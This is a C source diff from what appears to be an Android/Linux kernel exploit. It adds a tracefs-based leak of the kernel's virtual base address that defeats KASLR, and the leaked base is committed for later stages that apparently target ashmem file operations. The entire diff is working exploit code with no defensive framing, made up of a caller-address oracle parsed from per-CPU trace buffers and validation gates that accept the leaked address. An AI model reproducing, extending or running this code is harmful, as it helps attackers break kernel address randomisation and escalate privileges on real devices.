@@ -213,6 +213,9 @@ int p0_virtual_base_probe;
 #endif
 
 static int slide_commit_stext(uint64_t stext, const char *source);
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static int slide_commit_virtual_base(uint64_t base, const char *source);
+#endif
 static const uint64_t slide_max_offset = 0x3f8000ULL;
 
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
@@ -224,6 +227,10 @@ static unsigned int slide_tracefs_raw_events;
 static unsigned int slide_tracefs_raw_callers;
 static unsigned int slide_tracefs_parse_failures;
 static unsigned int slide_tracefs_candidate_hits[SLIDE_TRACEFS_CANDIDATES];
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static uint64_t slide_tracefs_virtual_base;
+static unsigned int slide_tracefs_virtual_hits;
+#endif
 
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -400,6 +407,22 @@ static int slide_tracefs_parse_page(const unsigned char *page,
                 (unsigned long long)caller, event_id, record_len);
       }
       slide_tracefs_raw_callers++;
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+      if (caller >= KIMAGE_VIRTUAL_BASE_MIN + SLIDE_TRACEFS_WORKER_CALLER_OFF) {
+        uint64_t cand_base = caller - SLIDE_TRACEFS_WORKER_CALLER_OFF;
+        if ((cand_base >> 48) == 0xffff &&
+            cand_base >= KIMAGE_VIRTUAL_BASE_MIN &&
+            cand_base <= KIMAGE_VIRTUAL_BASE_MAX &&
+            (cand_base & 0xffffULL) == 0) {
+          if (slide_tracefs_virtual_hits == 0) {
+            slide_tracefs_virtual_base = cand_base;
+            slide_tracefs_virtual_hits = 1;
+          } else if (slide_tracefs_virtual_base == cand_base) {
+            slide_tracefs_virtual_hits++;
+          }
+        }
+      }
+#endif
       static const uint64_t link_callers[] = {
         KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
 #ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
@@ -581,6 +604,11 @@ static int slide_tracefs_leak_kernel_base(void) {
   slide_tracefs_parse_failures = 0;
   memset(slide_tracefs_candidate_hits, 0,
          sizeof(slide_tracefs_candidate_hits));
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  slide_tracefs_virtual_base = 0;
+  slide_tracefs_virtual_hits = 0;
+  uint64_t candidate_virtual_base = 0;
+#endif
   for (int cpu = 0; cpu < cpu_count; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
@@ -639,8 +667,17 @@ static int slide_tracefs_leak_kernel_base(void) {
           slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
           slide_tracefs_raw_events, slide_tracefs_raw_callers,
           slide_tracefs_parse_failures, candidate_count, cpu_files);
-  if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
-      candidate_count != 1) {
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  if (slide_tracefs_virtual_hits > 0 && scan_ok && !slide_tracefs_parse_failures) {
+    pr_info("slide tracefs virtual base candidate=%016llx hits=%u\n",
+            (unsigned long long)slide_tracefs_virtual_base,
+            slide_tracefs_virtual_hits);
+    setup_ok = 1;
+    candidate_virtual_base = slide_tracefs_virtual_base;
+  }
+#endif
+  if (!setup_ok && (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
+      candidate_count != 1)) {
     pr_warning("slide tracefs candidate gate failed\n");
     goto out;
   }
@@ -663,6 +700,16 @@ out:
   if (!setup_ok) {
     return 0;
   }
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  if (candidate_virtual_base) {
+    pr_success("slide tracefs virtual base gate candidate=%016llx\n",
+               (unsigned long long)candidate_virtual_base);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    slide_p0_session_fresh = 1;
+#endif
+    return slide_commit_virtual_base(candidate_virtual_base, "tracefs");
+  }
+#endif
   pr_success("slide tracefs caller gate candidate=%08zx\n", candidate);
   return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
 }
@@ -670,7 +717,7 @@ out:
 
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 static int slide_commit_virtual_base(uint64_t base, const char *source) {
-  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
+  if ((base >> 48) != 0xffff || (base & 0xffffULL) != 0 ||
       base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
       base > UINT64_MAX - ASHMEM_FOPS_OFF) {
     pr_warning("virtual base rejected source=%s base=%016llx\n",
